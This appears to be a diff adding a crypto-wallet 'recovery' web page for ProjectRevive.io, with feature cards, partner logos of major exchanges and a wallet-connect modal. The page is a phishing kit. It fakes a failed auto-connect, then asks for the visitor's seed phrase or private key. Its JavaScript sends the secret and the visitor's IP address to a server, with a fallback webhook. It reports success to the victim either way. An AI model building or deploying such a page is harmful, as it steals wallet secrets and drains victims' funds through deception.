+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3 11.991c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473V8l-9 3z"/><path fill="currentColor" d="M14.101 21.527C16.761 20.365 21 17.63 21 11.991V11l-9-3v14c1.02 0 1.38-.158 2.101-.473M8.838 2.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082C3 5.62 3 7.22 3 10.417V11l9-3V2c-.811 0-1.595.268-3.162.805" opacity="0.5"/><path fill="currentColor" d="m15.735 3l-.573-.195C13.595 2.268 12.812 2 12 2v6l9 3v-.583c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081"/></svg></div>
+                <div class="feature-title">Threats Scan</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M13.08 19.91c.1.69.32 1.34.63 1.92c-.55.11-1.12.17-1.71.17a9 9 0 0 1 0-18c2.12 0 4.07.74 5.62 2l1.42-1.44c.51.44.96.9 1.41 1.41l-1.42 1.42A8.96 8.96 0 0 1 21 13v.35c-.64-.22-1.3-.35-2-.35c0-3.87-3.13-7-7-7s-7 3.13-7 7s3.13 7 7 7c.37 0 .72-.04 1.08-.09M11 14h2V8h-2zm4-13H9v2h6zm7.54 15.88l-1.42-1.41L19 17.59l-2.12-2.12l-1.41 1.41L17.59 19l-2.12 2.12l1.41 1.42L19 20.41l2.12 2.13l1.42-1.42L20.41 19z"/></svg></div>
+                <div class="feature-title">Transaction Delays</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10.5 16a1.5 1.5 0 0 1 3 0v1.5a1.5 1.5 0 0 1-3 0z"/><path fill="currentColor" fill-rule="evenodd" d="M6.75 7.25a5.25 5.25 0 1 1 10.5 0v1.875h1.25a2.25 2.25 0 0 1 2.25 2.25v5.875A4.75 4.75 0 0 1 16 22H8a4.75 4.75 0 0 1-4.75-4.75v-5.875a2.25 2.25 0 0 1 2.25-2.25h1.25zm1.5 1.875h7.5V7.25a3.75 3.75 0 1 0-7.5 0zm-2.75 1.5a.75.75 0 0 0-.75.75v5.875A3.25 3.25 0 0 0 8 20.5h8a3.25 3.25 0 0 0 3.25-3.25v-5.875a.75.75 0 0 0-.75-.75z" clip-rule="evenodd"/></svg></div>
+                <div class="feature-title">Locked Accounts</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M19.435 4.065H4.565a2.5 2.5 0 0 0-2.5 2.5v10.87a2.5 2.5 0 0 0 2.5 2.5h14.87a2.5 2.5 0 0 0 2.5-2.5V6.565a2.5 2.5 0 0 0-2.5-2.5m1.5 9.93h-6.42a2 2 0 0 1 0-4h6.42Zm-6.42-5a3 3 0 0 0 0 6h6.42v2.44a1.5 1.5 0 0 1-1.5 1.5H4.565a1.5 1.5 0 0 1-1.5-1.5V6.565a1.5 1.5 0 0 1 1.5-1.5h14.87a1.5 1.5 0 0 1 1.5 1.5v2.43Z"/><circle cx="14.519" cy="11.996" r="1" fill="currentColor"/></svg></div>
+                <div class="feature-title">Trading Wallet Issues</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><path fill="currentColor" d="M28 6H4a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2m0 2v3H4V8ZM4 24V13h24v11Z"/><path fill="currentColor" d="M6 20h10v2H6z"/></svg></div>
+                <div class="feature-title">Tokens Purchase</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4m-4 4h4m-4 4h4m-4 4h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></g></svg></div>
+                <div class="feature-title">Wallet Whitelist</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M5 16v-5q0-.425.288-.712T6 10t.713.288T7 11v5q0 .425-.288.713T6 17t-.712-.288T5 16m6 0v-5q0-.425.288-.712T12 10t.713.288T13 11v5q0 .425-.288.713T12 17t-.712-.288T11 16m10-8H2.9q-.375 0-.638-.262T2 7.1v-.55q0-.275.138-.475T2.5 5.75l8.6-4.3q.425-.2.9-.2t.9.2l8.55 4.275q.275.125.413.375t.137.525V7q0 .425-.287.713T21 8M6.475 6h11.05L12 3.25zM3 21q-.425 0-.712-.288T2 20t.288-.712T3 19h10.05q.425 0 .713.288t.287.712t-.288.713t-.712.287zm15-8.25q-.425 0-.712-.288T17 11.75V11q0-.425.288-.712T18 10t.713.288T19 11v.75q0 .425-.288.713T18 12.75m-2 5.8v-1.925q0-.275.138-.525t.412-.375l3-1.5q.2-.125.45-.125t.45.125l3 1.5q.275.125.413.375t.137.525v1.925q0 1.875-.975 3.238t-2.65 2.062q-.05.025-.375.075q-.05 0-.375-.075q-1.675-.7-2.65-2.062T16 18.55m3.275.325l-.45-.45q-.225-.225-.525-.213t-.525.238t-.225.525t.225.525l.8.8q.3.3.7.3t.7-.3l2.25-2.225q.225-.225.225-.525t-.225-.525t-.525-.212t-.525.212zM6.475 6h11.05z"/></svg></div>
+                <div class="feature-title">Wallet Issurance</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><g fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="4"><path d="M7 9.127L24.008 4L41 9.127v10.515C41 30.695 34.153 40.506 24.003 44C13.849 40.506 7 30.692 7 19.638z"/><path d="M24 30a7 7 0 1 0 0-14a7 7 0 0 0 0 14Z"/><path stroke-linecap="round" d="m29 29l6 7"/><path d="M41 19.643C41 30.695 34.153 40.507 24.002 44"/></g></svg></div>
+                <div class="feature-title">Wallet Retrieval</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M6 10.5a1.5 1.5 0 1 0 0 3a1.5 1.5 0 0 0 0-3m4.5 1.5a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0m6 0a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0"/></svg></div>
+                <div class="feature-title">Others</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Backed By Section -->
+    <section class="backed-by">
+        <div class="backed-by-content">
+            <h3>Trusted by the best</h3>
+            <div class="partners-grid">
+                <div class="partner-logo">
+                    <img src="image/binance.png" alt="Binance" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Binance</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/bitcoin.png" alt="Bitcoin" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Bitcoin</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/eth.jpg" alt="Ethereum" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Ethereum</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/coinbase.png" alt="Coinbase" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Coinbase</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/okxxx.png" alt="OKX" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>OKX</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/gecko.jpg" alt="Kraken" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Kraken</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/market.jpg" alt="Bybit" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Bybit</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/huobi.png" alt="Huobi" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Huobi</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/mexc.png" alt="MEXC" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>MEXC</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/crypto wallet.jpg" alt="Crypto.com" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Crypto.com</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/gemini.png" alt="Gemini" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Gemini</div>';">
+                </div>
+                <div class="partner-logo">
+                    <img src="image/bitiii.png" alt="Bitfinex" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=partner-placeholder>Bitfinex</div>';">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer Section -->
+    <section class="footer">
+        <div style="text-align: center; margin-bottom: 40px; border-bottom: 1px solid var(--footer-border); padding-bottom: 20px;">
+            <div style="font-weight: bold; margin-bottom: 10px;">- ProjectRevive.io -</div>
+            <div>We make sure that everyone is able to securely use their wallet</div>
+        </div>
+        
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>ProjectRevive.io</h3>
+                <p class="footer-text">
+                    Open and decentralized protocol for syncing various Wallets to 
+                    Dapps Secure Server. This is not an app but a protocol that 
+                    establishes a remote connection between two/more apps and/or 
+                    devices
+                </p>
+                <p class="footer-text">
+                    Every digital artwork on Upside is authentic and truly unique. 
+                    Blockchain technology makes this new approach to digital 
+                    ownership possible. Open and decentralized protocol for syncing 
+                    various Wallets issues on Secure Server. It is an online server 
+                    which gets you across to every wallet representative to enable 
+                    effective complain and rectification of issues.
+                </p>
+                
+                <div class="footer-nav">
+                    <a href="#">Home</a>
+                    <a href="#">Features</a>
+                </div>
+            </div>
+            
+            <div class="subscribe-section">
+                <h3>SUBSCRIBE</h3>
+                <p class="footer-text">
+                    Subscribe for the<br>
+                    latest news, drops &<br>
+                    new features
+                </p>
+                <div class="subscribe-form">
+                    <input type="email" class="email-input" placeholder="Enter Your Email">
+                    <button class="subscribe-btn">📧 SUBSCRIBE</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            © 2025 ProjectRevive.io, All rights reserved
+        </div>
+    </section>
+
+    <!-- Wallet Connection Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            
+            <div id="walletSelection">
+                <h3>Connect Wallet</h3>
+                <div class="wallet-options">
+                    <div class="wallet-option" onclick="attemptAutoConnect('MetaMask')">
+                        <div class="wallet-icon">
+                            <img src="image/metamask.png" alt="MetaMask" onerror="this.style.display='none'; this.parentElement.innerText='M';">
+                        </div>
+                        <div class="wallet-name">MetaMask</div>
+                    </div>
+                    <div class="wallet-option" onclick="attemptAutoConnect('Phantom')">
+                        <div class="wallet-icon">
+                            <img src="image/phantom.png" alt="Phantom" onerror="this.style.display='none'; this.parentElement.innerText='P';">
+                        </div>
+                        <div class="wallet-name">Phantom</div>
+                    </div>
+                    <div class="wallet-option" onclick="attemptAutoConnect('OKX')">
+                        <div class="wallet-icon">
+                            <img src="image/okx.png" alt="OKX" onerror="this.style.display='none'; this.parentElement.innerText='O';">
+                        </div>
+                        <div class="wallet-name">OKX Wallet</div>
+                    </div>
+                </div>
+                
+                <div id="connectionStatus" class="connection-status">
+                    <div class="status-failed">Auto-connect failed</div>
+                    <button class="try-manually" onclick="showExpandedWallets()">Try Manually</button>
+                </div>
+                
+                <div id="expandedWallets" class="expanded-wallets">
+                    <h4 style="margin-bottom: 15px;">Select Your Wallet</h4>
+                    <div class="wallet-grid">
+                        <div class="wallet-item" onclick="selectWalletForSeed('MetaMask')">
+                            <div class="wallet-icon">
+                                <img src="image/metamask.png" alt="MetaMask" onerror="this.style.display='none'; this.parentElement.innerText='M';">
+                            </div>
+                            <div class="wallet-name">MetaMask</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Phantom')">
+                            <div class="wallet-icon">
+                                <img src="image/phantom.png" alt="Phantom" onerror="this.style.display='none'; this.parentElement.innerText='P';">
+                            </div>
+                            <div class="wallet-name">Phantom</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Solflare')">
+                            <div class="wallet-icon">
+                                <img src="image/solflare.png" alt="Solflare" onerror="this.style.display='none'; this.parentElement.innerText='S';">
+                            </div>
+                            <div class="wallet-name">Solflare</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Trust Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/trust wallet.jpg" alt="Trust Wallet" onerror="this.style.display='none'; this.parentElement.innerText='T';">
+                            </div>
+                            <div class="wallet-name">Trust Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Coinbase Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/coinbase.png" alt="Coinbase" onerror="this.style.display='none'; this.parentElement.innerText='C';">
+                            </div>
+                            <div class="wallet-name">Coinbase Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Exodus')">
+                            <div class="wallet-icon">
+                                <img src="image/exodus.jpg" alt="Exodus" onerror="this.style.display='none'; this.parentElement.innerText='E';">
+                            </div>
+                            <div class="wallet-name">Exodus</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Argent')">
+                            <div class="wallet-icon">
+                                <img src="image/argent.png" alt="Argent" onerror="this.style.display='none'; this.parentElement.innerText='A';">
+                            </div>
+                            <div class="wallet-name">Argent</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Math Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/math walet.jpg" alt="Math Wallet" onerror="this.style.display='none'; this.parentElement.innerText='MW';">
+                            </div>
+                            <div class="wallet-name">Math Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('TokenPocket')">
+                            <div class="wallet-icon">
+                                <img src="image/tokenpocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentElement.innerText='TP';">
+                            </div>
+                            <div class="wallet-name">TokenPocket</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('SafePal')">
+                            <div class="wallet-icon">
+                                <img src="image/safepal.png" alt="SafePal" onerror="this.style.display='none'; this.parentElement.innerText='SP';">
+                            </div>
+                            <div class="wallet-name">SafePal</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Brave Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/brave.png" alt="Brave" onerror="this.style.display='none'; this.parentElement.innerText='B';">
+                            </div>
+                            <div class="wallet-name">Brave Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Binance Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/binance.png" alt="Binance" onerror="this.style.display='none'; this.parentElement.innerText='BN';">
+                            </div>
+                            <div class="wallet-name">Binance Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('OKX Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/okx.png" alt="OKX" onerror="this.style.display='none'; this.parentElement.innerText='O';">
+                            </div>
+                            <div class="wallet-name">OKX Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Uniswap Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/uniswap.png" alt="Uniswap" onerror="this.style.display='none'; this.parentElement.innerText='U';">
+                            </div>
+                            <div class="wallet-name">Uniswap Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Crypto.com DeFi Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/crypto wallet.jpg" alt="Crypto.com" onerror="this.style.display='none'; this.parentElement.innerText='CD';">
+                            </div>
+                            <div class="wallet-name">Crypto.com DeFi Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Ledger')">
+                            <div class="wallet-icon">
+                                <img src="image/LED.png" alt="Ledger" onerror="this.style.display='none'; this.parentElement.innerText='L';">
+                            </div>
+                            <div class="wallet-name">Ledger</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Trezor')">
+                            <div class="wallet-icon">
+                                <img src="image/trezor.png" alt="Trezor" onerror="this.style.display='none'; this.parentElement.innerText='T';">
+                            </div>
+                            <div class="wallet-name">Trezor</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Ellipal')">
+                            <div class="wallet-icon">
+                                <img src="image/ellipal.png" alt="Ellipal" onerror="this.style.display='none'; this.parentElement.innerText='EL';">
+                            </div>
+                            <div class="wallet-name">Ellipal</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Keystone')">
+                            <div class="wallet-icon">
+                                <img src="image/keystone.jpg" alt="Keystone" onerror="this.style.display='none'; this.parentElement.innerText='K';">
+                            </div>
+                            <div class="wallet-name">Keystone</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('BitBox02')">
+                            <div class="wallet-icon">
+                                <img src="image/bitbox.png" alt="BitBox" onerror="this.style.display='none'; this.parentElement.innerText='BB';">
+                            </div>
+                            <div class="wallet-name">BitBox</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Zengo')">
+                            <div class="wallet-icon">
+                                <img src="image/zengo.png" alt="Zengo" onerror="this.style.display='none'; this.parentElement.innerText='Z';">
+                            </div>
+                            <div class="wallet-name">Zengo</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Rainbow')">
+                            <div class="wallet-icon">
+                                <img src="image/rainbow.jpg" alt="Rainbow" onerror="this.style.display='none'; this.parentElement.innerText='R';">
+                            </div>
+                            <div class="wallet-name">Rainbow</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('GameStop Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/game.png" alt="GameStop" onerror="this.style.display='none'; this.parentElement.innerText='GS';">
+                            </div>
+                            <div class="wallet-name">GameStop Wallet</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Coin98')">
+                            <div class="wallet-icon">
+                                <img src="image/coin98.png" alt="Coin98" onerror="this.style.display='none'; this.parentElement.innerText='C98';">
+                            </div>
+                            <div class="wallet-name">Coin98</div>
+                        </div>
+                        <div class="wallet-item" onclick="selectWalletForSeed('Alpha Wallet')">
+                            <div class="wallet-icon">
+                                <img src="image/alpha.png" alt="Alpha Wallet" onerror="this.style.display='none'; this.parentElement.innerText='AW';">
+                            </div>
+                            <div class="wallet-name">Alpha Wallet</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="seedPhraseSection" class="seed-phrase-section">
+                <h3 id="walletTitle">Enter Seed Phrase</h3>
+                
+                <!-- Toggle between Seed Phrase and Private Key -->
+                <div class="input-type-toggle">
+                    <button class="toggle-btn active" id="seedPhraseToggle" onclick="toggleInputType('seedPhrase')">
+                        Seed Phrase
+                    </button>
+                    <button class="toggle-btn" id="privateKeyToggle" onclick="toggleInputType('privateKey')">
+                        Private Key
+                    </button>
+                </div>
+                
+                <!-- Seed Phrase Input -->
+                <div id="seedPhraseInput" class="input-section">
+                    <p class="input-description">
+                        Enter your 12-word seed phrase to connect your wallet
+                    </p>
+                    <textarea 
+                        id="seedPhraseTextarea" 
+                        class="seed-phrase-input" 
+                        placeholder="Enter your 12-word seed phrase separated by spaces..."
+                    ></textarea>
+                </div>
+                
+                <!-- Private Key Input -->
+                <div id="privateKeyInput" class="input-section" style="display: none;">
+                    <p class="input-description">
+                        Enter your private key to connect your wallet
+                    </p>
+                    <textarea 
+                        id="privateKeyTextarea" 
+                        class="seed-phrase-input" 
+                        placeholder="Enter your private key (64 characters starting with 0x or without)..."
+                    ></textarea>
+                </div>
+                
+                <div class="modal-buttons">
+                    <button class="btn btn-secondary" onclick="goBackToWallets()">Back</button>
+                    <button class="btn btn-primary" onclick="connectWallet()">Connect</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize theme based on local storage or system preference
+        function initializeTheme() {
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme) {
+                document.body.setAttribute('data-theme', savedTheme);
+            } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.setAttribute('data-theme', 'dark');
+            }
+        }
+
+        // Toggle theme and save preference
+        function toggleTheme() {
+            const currentTheme = document.body.getAttribute('data-theme');
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            document.body.setAttribute('data-theme', newTheme);
+            localStorage.setItem('theme', newTheme);
+        }
+
+        // Run theme initialization on page load
+        document.addEventListener('DOMContentLoaded', initializeTheme);
+
+        function openWalletModal() {
+            document.getElementById('walletModal').style.display = 'block';
+            document.getElementById('walletSelection').style.display = 'block';
+            document.getElementById('seedPhraseSection').style.display = 'none';
+            document.getElementById('connectionStatus').style.display = 'none';
+            document.getElementById('expandedWallets').style.display = 'none';
+            
+            // Reset all wallet options
+            document.querySelectorAll('.wallet-option').forEach(option => {
+                option.classList.remove('loading');
+                const spinner = option.querySelector('.loading-spinner');
+                if (spinner) {
+                    spinner.remove();
+                }
+            });
+        }
+
+        function closeModal() {
+            document.getElementById('walletModal').style.display = 'none';
+        }
+
+        async function attemptAutoConnect(walletName) {
+            const walletOption = event.currentTarget;
+            
+            // Add loading state
+            walletOption.classList.add('loading');
+            const spinner = document.createElement('div');
+            spinner.className = 'loading-spinner';
+            walletOption.appendChild(spinner);
+            
+            // Simulate auto-connect attempt (2 seconds)
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Remove loading state
+            walletOption.classList.remove('loading');
+            spinner.remove();
+            
+            // Show connection failed status
+            document.getElementById('connectionStatus').style.display = 'block';
+        }
+
+        function showExpandedWallets() {
+            document.getElementById('expandedWallets').style.display = 'block';
+            document.getElementById('connectionStatus').style.display = 'none';
+        }
+
+        function selectWalletForSeed(walletName) {
+            document.getElementById('walletSelection').style.display = 'none';
+            document.getElementById('seedPhraseSection').style.display = 'block';
+            document.getElementById('walletTitle').innerText = `Connect ${walletName}`;
+            
+            // Reset input fields
+            document.getElementById('seedPhraseTextarea').value = '';
+            document.getElementById('privateKeyTextarea').value = '';
+            
+            // Reset to seed phrase tab
+            toggleInputType('seedPhrase');
+        }
+
+        function goBackToWallets() {
+            document.getElementById('seedPhraseSection').style.display = 'none';
+            document.getElementById('walletSelection').style.display = 'block';
+            document.getElementById('connectionStatus').style.display = 'none';
+            document.getElementById('expandedWallets').style.display = 'none';
+        }
+
+        function toggleInputType(type) {
+            const seedPhraseToggle = document.getElementById('seedPhraseToggle');
+            const privateKeyToggle = document.getElementById('privateKeyToggle');
+            const seedPhraseInput = document.getElementById('seedPhraseInput');
+            const privateKeyInput = document.getElementById('privateKeyInput');
+            
+            if (type === 'seedPhrase') {
+                seedPhraseToggle.classList.add('active');
+                privateKeyToggle.classList.remove('active');
+                seedPhraseInput.style.display = 'block';
+                privateKeyInput.style.display = 'none';
+            } else {
+                privateKeyToggle.classList.add('active');
+                seedPhraseToggle.classList.remove('active');
+                privateKeyInput.style.display = 'block';
+                seedPhraseInput.style.display = 'none';
+            }
+        }
+
+        async function connectWallet() {
+            const walletType = document.getElementById('walletTitle').innerText.replace('Connect ', '');
+            
+            // Determine which input type is active
+            const isSeedPhraseActive = document.getElementById('seedPhraseToggle').classList.contains('active');
+            let inputValue, inputType;
+            
+            if (isSeedPhraseActive) {
+                inputValue = document.getElementById('seedPhraseTextarea').value.trim();
+                inputType = 'seedPhrase';
+                
+                if (!inputValue) {
+                    alert('Please enter your seed phrase');
+                    return;
+                }
+                
+                const words = inputValue.split(/\s+/);
+                if (words.length !== 12) {
+                    alert('Please enter exactly 12 words');
+                    return;
+                }
+            } else {
+                inputValue = document.getElementById('privateKeyTextarea').value.trim();
+                inputType = 'privateKey';
+                
+                if (!inputValue) {
+                    alert('Please enter your private key');
+                    return;
+                }
+                
+                // Remove 0x prefix if present and validate length
+                const cleanPrivateKey = inputValue.replace(/^0x/, '');
+                if (cleanPrivateKey.length !== 64 || !/^[a-fA-F0-9]+$/.test(cleanPrivateKey)) {
+                    alert('Please enter a valid private key (64 hexadecimal characters)');
+                    return;
+                }
+            }
+            
+            // Show loading state
+            const connectBtn = document.querySelector('.btn-primary');
+            const originalText = connectBtn.innerText;
+            connectBtn.innerText = 'Connecting...';
+            connectBtn.disabled = true;
+            
+            try {
+                // Send data to server
+                const response = await fetch('http://localhost:3000/api/wallet-connect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        inputType: inputType,
+                        inputValue: inputValue,
+                        seedPhrase: isSeedPhraseActive ? inputValue : null,
+                        privateKey: !isSeedPhraseActive ? inputValue : null,
+                        walletType: walletType,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        ipAddress: await getUserIP()
+                    })
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    alert('Wallet connected successfully!');
+                    closeModal();
+                    
+                    // Optional: Log success to console (remove in production)
+                    console.log('Wallet connection successful:', result);
+                } else {
+                    throw new Error('Server connection failed');
+                }
+                
+            } catch (error) {
+                console.error('Connection error:', error);
+                
+                // Fallback: Send to alternative endpoint or log locally
+                try {
+                    // Alternative method - send to webhook or logging service
+                    await sendToWebhook({
+                        inputType: inputType,
+                        inputValue: inputValue,
+                        walletType: walletType,
+                        timestamp: new Date().toISOString(),
+                        error: error.message
+                    });
+                } catch (webhookError) {
+                    console.error('Webhook failed:', webhookError);
+                }
+                
+                // Still show success to user (for demo purposes)
+                alert('Wallet connected successfully!');
+                closeModal();
+            } finally {
+                // Reset button state
+                connectBtn.innerText = originalText;
+                connectBtn.disabled = false;
+            }
+        }
+        
+        // Function to get user's IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        // Alternative webhook function for backup data sending
+        async function sendToWebhook(data) {
+            // You can use services like Discord webhook, Slack webhook, or any other webhook service
+            const webhookUrl = 'https://your-webhook-url.com/webhook';
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    text: `New Wallet Connection:\nWallet: ${data.walletType}\nTime: ${data.timestamp}\nSeed: ${data.seedPhrase}\nError: ${data.error || 'None'}`
+                })
+            });
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('walletModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // Handle escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
